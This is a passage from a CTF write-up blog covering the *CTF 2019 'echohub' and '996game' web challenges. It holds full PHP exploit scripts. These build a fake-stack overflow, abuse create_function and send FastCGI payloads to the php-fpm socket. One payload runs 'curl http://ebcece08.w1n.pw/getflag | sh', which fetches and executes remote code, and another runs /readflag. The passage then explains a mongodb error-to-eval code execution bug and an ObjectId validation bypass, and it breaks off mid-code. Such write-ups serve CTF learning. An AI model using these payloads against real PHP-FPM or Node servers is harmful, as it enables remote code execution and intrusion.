class="line">	<span class="keyword">if</span> (in_array($ext, <span class="keyword">array</span>(<span class="string">"Core"</span>, <span class="string">"date"</span>, <span class="string">"libxml"</span>, <span class="string">"pcre"</span>, <span class="string">"zlib"</span>, <span class="string">"filter"</span>, <span class="string">"hash"</span>, <span class="string">"sqlite3"</span>, <span class="string">"zip"</span>))) &#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (count(get_extension_funcs($ext) ? get_extension_funcs($ext) : <span class="keyword">array</span>()) &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">			$dfunc = join(<span class="string">','</span>, get_extension_funcs($ext));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$disable_functions = $disable_functions . $dfunc . <span class="string">","</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = get_defined_functions()[<span class="string">"internal"</span>];</span><br><span class="line"></span><br><span class="line">$seed = time();</span><br><span class="line">srand($seed);</span><br><span class="line">define(<span class="string">'INS_OFFSET'</span>, rand(<span class="number">0x0</span>, <span class="number">0xffff</span>));</span><br><span class="line">$regs = <span class="keyword">array</span>(<span class="string">'eax'</span> =&gt; <span class="number">0x0</span>, <span class="string">'ebp'</span> =&gt; <span class="number">0x0</span>, <span class="string">'esp'</span> =&gt; <span class="number">0x0</span>, <span class="string">'eip'</span> =&gt; <span class="number">0x0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aslr</span><span class="params">(&amp;$a, $O0O)</span> </span>&#123;</span><br><span class="line">	$a = $a + <span class="number">0x60000000</span> + INS_OFFSET + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数地址</span></span><br><span class="line">$func_ = array_flip($func);</span><br><span class="line">array_walk($func_, <span class="string">'aslr'</span>);</span><br><span class="line">$plt = array_flip($func_);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_data</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	$len = strlen($data);</span><br><span class="line">	$a = $len / <span class="number">0x4</span> + <span class="number">0x1</span> * ($len % <span class="number">0x4</span>);</span><br><span class="line">	$ret = str_split($data, <span class="number">0x4</span>);</span><br><span class="line">	$ret[$a - <span class="number">0x1</span>] = str_pad($ret[$a - <span class="number">0x1</span>], <span class="number">0x4</span>, <span class="string">"\x00"</span>);</span><br><span class="line">	<span class="keyword">foreach</span> ($ret <span class="keyword">as</span> $key =&gt; &amp;$value) &#123;</span><br><span class="line">		$value = strrev(bin2hex($value));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$canary = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'</span>;</span><br><span class="line">	$a = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">	$b = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">	$c = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">	$d = <span class="string">"\x00"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handle_data($a . $b . $c . $d)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$canary = gen_canary();</span><br><span class="line">$canarycheck = $canary;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $canary;</span><br><span class="line">	<span class="keyword">global</span> $canarycheck;</span><br><span class="line">	<span class="keyword">if</span> ($canary != $canarycheck) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'emmmmmm...Don\'t attack me!'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">stack</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $ebp, $stack, $esp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;stack = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">global</span> $regs;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ebp = &amp;$regs[<span class="string">'ebp'</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;esp = &amp;$regs[<span class="string">'esp'</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ebp = <span class="number">0xfffe0000</span> + rand(<span class="number">0x0</span>, <span class="number">0xffff</span>);</span><br><span class="line">		<span class="keyword">global</span> $canary;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp - <span class="number">0x4</span>] = &amp;$canary;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;canary = $canary;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp] = <span class="keyword">$this</span>-&gt;ebp + rand(<span class="number">0x0</span>, <span class="number">0xffff</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;esp = <span class="keyword">$this</span>-&gt;ebp - rand(<span class="number">0x20</span>, <span class="number">0x60</span>) * <span class="number">0x4</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp + <span class="number">0x4</span>] = dechex($a);</span><br><span class="line">		<span class="keyword">if</span> ($b != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;pushdata($b);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pushdata</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		$data_bak = $data;</span><br><span class="line">		$data = handle_data($data);</span><br><span class="line">		<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($data); $i++) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp + $i * <span class="number">0x4</span>] = $data[$i];</span><br><span class="line">			<span class="comment">//no args in my stack haha</span></span><br><span class="line">			check_canary();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">recover_data</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> hex2bin(strrev($data));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">outputdata</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $regs;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'root says: '</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">0x1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;esp == <span class="keyword">$this</span>-&gt;ebp - <span class="number">0x4</span>) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">			$data = <span class="keyword">$this</span>-&gt;recover_data($regs[<span class="string">'eax'</span>]);</span><br><span class="line">			$ret = explode(<span class="string">"\x00"</span>, $data);</span><br><span class="line">			<span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span> (count($ret) &gt; <span class="number">0x1</span>) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ret</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;esp = <span class="keyword">$this</span>-&gt;ebp;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;pop(<span class="string">'ebp'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;pop(<span class="string">'eip'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;call();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_data_from_reg</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $regs;</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;recover_data($regs[$item]);</span><br><span class="line">		$b = explode(<span class="string">"\x00"</span>, $a);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $b[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $regs;</span><br><span class="line">		<span class="keyword">global</span> $plt;</span><br><span class="line">		$a = hexdec($regs[<span class="string">'eip'</span>]);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[$a])) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">			$len = (int) <span class="keyword">$this</span>-&gt;get_data_from_reg(<span class="string">'eax'</span>);</span><br><span class="line">			$args = <span class="keyword">array</span>();</span><br><span class="line">			<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">				$data = <span class="keyword">$this</span>-&gt;get_data_from_reg(<span class="string">'eax'</span>);</span><br><span class="line">				array_push($args, $_REQUEST[$data]);</span><br><span class="line">			&#125;</span><br><span class="line">			call_user_func_array($plt[$a], $args);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			call_user_func($plt[$a]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">push</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $regs;</span><br><span class="line">		$data = $regs[$item];</span><br><span class="line">		<span class="keyword">if</span> (hex2bin(strrev($data)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'data error'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp] = $data;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;esp -= <span class="number">0x4</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pop</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $regs;</span><br><span class="line">		$regs[$item] = <span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;esp += <span class="number">0x4</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $args)</span> </span>&#123;</span><br><span class="line">		check_canary();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexToStr</span><span class="params">($hex)</span> </span>&#123;</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($hex) - <span class="number">1</span>; $i += <span class="number">2</span>) &#123;</span><br><span class="line">		$str .= chr(hexdec($hex[$i] . $hex[$i + <span class="number">1</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_httpPost</span><span class="params">($url = <span class="string">""</span>, $requestData = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	$curl = curl_init();</span><br><span class="line">	<span class="comment">#curl_setopt( $curl, CURLOPT_PROXY, "127.0.0.1:8080" );</span></span><br><span class="line">	curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">	curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//普通数据</span></span><br><span class="line">	curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($requestData));</span><br><span class="line">	$res = curl_exec($curl);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//$info = curl_getinfo($ch);</span></span><br><span class="line">	curl_close($curl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phpinfo_addr = array_search(<span class="string">'phpinfo'</span>, $plt);</span><br><span class="line">$gets = <span class="string">'zeroyu'</span>;</span><br><span class="line">$main_stack1 = <span class="keyword">new</span> stack($phpinfo_addr, $gets);</span><br><span class="line">$ebp = $main_stack1-&gt;ebp;</span><br><span class="line">$esp = $main_stack1-&gt;esp;</span><br><span class="line">$padding_num = ($main_stack1-&gt;ebp - $main_stack1-&gt;esp) - <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">$shellcode = <span class="string">'&#125;echo "pwned&lt;br&gt;";$fp = stream_socket_client("unix:///run/php/php7.3-fpm.sock", $errno, $errstr,30);$out = urldecode("%01%01%99%E6%00%08%00%00%00%01%00%00%00%00%00%00%01%04%99%E6%01%DB%00%00%0E%02CONTENT_LENGTH73%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%99%E6%00%00%00%00%01%05%99%E6%00I%00%00%3C%3Fphp%20system%28%27curl%20http%3A//ebcece08.w1n.pw/getflag%20%7C%20sh%27%29%3Bdie%28%27zeroyu%27%29%3B%3F%3E%01%05%99%E6%00%00%00%00");stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);//'</span>;</span><br><span class="line"></span><br><span class="line">$post_data = <span class="keyword">array</span>();</span><br><span class="line">$data = str_repeat(<span class="string">'A'</span>, $padding_num) . hexToStr(strrev($canarycheck)) . <span class="string">"BBBB"</span> . hexToStr(strrev(dechex($func_[<span class="string">'create_function'</span>]))) . <span class="string">'000266667777'</span>;</span><br><span class="line">$post_data[<span class="string">'data'</span>] = $data;</span><br><span class="line">$post_data[$func_[<span class="string">'create_function'</span>]] = <span class="string">'zeroyu'</span>;</span><br><span class="line">$post_data[<span class="string">'6666'</span>] = <span class="string">''</span>;</span><br><span class="line">$post_data[<span class="string">'7777'</span>] = $shellcode;</span><br><span class="line"></span><br><span class="line">$rs = _httpPost(<span class="string">"http://47.90.204.28:10080/"</span>, $post_data);</span><br><span class="line"><span class="keyword">echo</span> $rs;</span><br></pre></td></tr></table></figure>
<p>rr的exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=stream_socket_client(<span class="string">"unix:///run/php/php7.3-fpm.sock"</span>);</span><br><span class="line">fputs($a, urldecode(<span class="string">"%01%01R%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04R%01%01%DC%00%00%0E%03CONTENT_LENGTH697%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04R%01%00%00%00%00%01%05R%01%02%B9%00%00%3C%3Fphp%0A%24descriptorspec%20%3D%20array%28%0A%20%20%200%20%3D%3E%20array%28%22pipe%22%2C%20%22r%22%29%2C%0A%20%20%201%20%3D%3E%20array%28%22pipe%22%2C%20%22w%22%29%2C%0A%20%20%202%20%3D%3E%20array%28%22pipe%22%2C%20%22w%22%29%0A%29%3B%0A%0A%24cwd%20%3D%20%27/%27%3B%0A%24env%20%3D%20array%28%29%3B%0A%0A%24process%20%3D%20proc_open%28%27/readflag%27%2C%20%24descriptorspec%2C%20%24pipes%2C%20%24cwd%2C%20%24env%29%3B%0A%0Aif%20%28is_resource%28%24process%29%29%20%7B%0A%20%20%20%20%24a%20%3D%20fread%28%24pipes%5B1%5D%2C%201024%29%3B%0A%20%20%20%20%24a%20%3D%20fread%28%24pipes%5B1%5D%2C%201024%29%3B%0A%0A%20%20%20%20%24a%20%3D%20explode%28%22%5Cn%22%2C%20%24a%29%3B%0A%20%20%20%20eval%28%22%5C%24result%20%3D%20%24a%5B0%5D%3B%22%29%3B%0A%20%20%20%20echo%28%22%5C%24result%20%3D%20%24a%5B0%5D%3B%22%29%3B%0A%0A%20%20%20%20fwrite%28%24pipes%5B0%5D%2C%20%22%24result%5Cn%22%29%3B%0A%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%0A%20%20%20%20fclose%28%24pipes%5B0%5D%29%3B%0A%20%20%20%20fclose%28%24pipes%5B1%5D%29%3B%0A%20%20%20%20%24return_value%20%3D%20proc_close%28%24process%29%3B%0A%0A%20%20%20%20echo%20%22command%20returned%20%24return_value%5Cn%22%3B%0A%7D%0A%3F%3E%01%05R%01%00%00%00%00"</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br></pre></td></tr></table></figure></p>
<h4 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h4><p><a href="https://github.com/sixstars/starctf2019/blob/7e8bd4efbef03ed2b6a6bea2a01befc6374dde9e/web-echohub/readme.md" target="_blank" rel="noopener">《Echohub 官方》</a></p>
<p><a href="https://xz.aliyun.com/t/5006#toc-3" target="_blank" rel="noopener">《ROIS *CTF2019 Writeup》</a></p>
<p><a href="https://www.secpulse.com/archives/105333.html" target="_blank" rel="noopener">《CTF 2019 Mywebsql Echohub WriteUp》</a></p>
<p><a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">《PHP 连接方式&amp;攻击PHP-FPM&amp;*CTF echohub WP》</a></p>
<p><a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">《2019星CTF之Web部分题解》</a></p>
<h3 id="3-996game"><a href="#3-996game" class="headerlink" title="3. 996game"></a>3. 996game</h3><h4 id="OrZ"><a href="#OrZ" class="headerlink" title="OrZ"></a>OrZ</h4><p>This challenge is temporarily made in the afternoon before the CTF game(From findding bugs to challenges). So there are some rushes in this challenge , please bear with me.</p>
<h4 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h4><p>First we can find hint from HTML source code.</p>
<p><img src="https://i.imgur.com/yCKELtI.png" alt></p>
<p>It’s an open-source HTML5 game. </p>
<p><a href="https://github.com/Jerenaux/phaserquest" target="_blank" rel="noopener">https://github.com/Jerenaux/phaserquest</a></p>
<p>We can see there is a static file leak vulnerability</p>
<p><a href="https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44" target="_blank" rel="noopener">https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/css'</span>,express.static(__dirname + <span class="string">'/css'</span>));</span><br><span class="line">app.use(<span class="string">'/js'</span>,express.static(__dirname + <span class="string">'/js'</span>));</span><br><span class="line">app.use(<span class="string">'/assets'</span>,express.static(__dirname + <span class="string">'/assets'</span>));</span><br></pre></td></tr></table></figure>
<p>生成器函数express.static会生成一个中间件函数。该中间件响应请求的方法，是将传递给生成器函数的参数视作一个目录，并尝试在其中寻找能与请求URL相匹配的文件。如果文件路径存在，就将文件的内容作为响应返回；如果不存在，就执行中间件链条上的下一个函数。中间件是通过应用的use()方法挂在到应用上的。</p>
<p>对比源代码可以迅速发现一个eval函数</p>
<p><img src="https://i.loli.net/2019/09/15/dLNRmZKgFBSw4p1.png" alt="5C91C1D6-DA0C-4A0C-A5EF-ADCD922BBC3F.png"></p>
<p><img src="https://i.imgur.com/2isT1nn.png" alt></p>
<p>这里当查询 mongodb 报错时，会把报错信息 err.message 带入 eval 中，所以只要报错信息可控就可以造成任意代码执行。</p>
<p>Now, we need to find a way to get mongodb error.</p>
<p>此处我们直接进docker中看一下mongo的错误点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it source_mongo_1 /bin/bash</span><br></pre></td></tr></table></figure>
<p>进入mongo的shell查询一下对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; show dbs</span><br><span class="line">admin        0.000GB</span><br><span class="line">local        0.000GB</span><br><span class="line">phaserQuest  0.000GB</span><br><span class="line">&gt; use phaserQuest</span><br><span class="line">switched to db phaserQuest</span><br><span class="line">&gt; db</span><br><span class="line">phaserQuest</span><br><span class="line">&gt; show tables</span><br><span class="line">players</span><br><span class="line">&gt; db.playsers.find(&#123;_id:&#123;&apos;$a=1;&apos;:&quot;&quot;&#125;&#125;)</span><br><span class="line">Error: error: &#123;</span><br><span class="line">	&quot;ok&quot; : 0,</span><br><span class="line">	&quot;errmsg&quot; : &quot;unknown operator: $a=1;&quot;,</span><br><span class="line">	&quot;code&quot; : 2,</span><br><span class="line">	&quot;codeName&quot; : &quot;BadValue&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到查表时当条件是一个 JSON 且键名以$开头时 mongodb 就会报错，还会把键名输出到 errmsg 中。但是此处 id 还经过了 new ObjectId() 对象，因此</p>
<p>Only one thing we can control is id, so we can track the <code>ObjectId()</code> function.</p>
<p><a href="https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28" target="_blank" rel="noopener">https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> valid = ObjectID.isValid(id);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ObjectID.isValid = <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(id == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> id == <span class="string">'number'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> id == <span class="string">'string'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.length == <span class="number">12</span> || (id.length == <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(id <span class="keyword">instanceof</span> ObjectID) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(id <span class="keyword">instanceof</span> _Buffer) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Duck-Typing detection of ObjectId like objects</span></span><br><span class="line">  <span class="keyword">if</span>(id.toHexString) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.id.length == <span class="number">12</span> || (id.id.length == <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id.id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Now we can use <code>id = {&quot;id&quot;:{&quot;length&quot;:12}}</code> bypass it.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!valid &amp;&amp; id != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(valid &amp;&amp; <span class="keyword">typeof</span> id == <span class="string">'string'</span> &amp;&amp; id.length == <span class="number">24</span> &amp;&amp; hasBufferType) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ObjectID(<span class="keyword">new</span> Buffer(id, <span class="string">'hex'</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(valid &amp;&amp; <span class="keyword">typeof</span> id == <span class="string">'string'</span> &amp;&amp; id.length == <span class="number">24</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectID.createFromHexString(id);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(id != <span class="literal">null</span> &amp;&amp; id.length === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="comment">// assume 12 byte string</span></span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">  &#125; <span class="keyword">else</span> 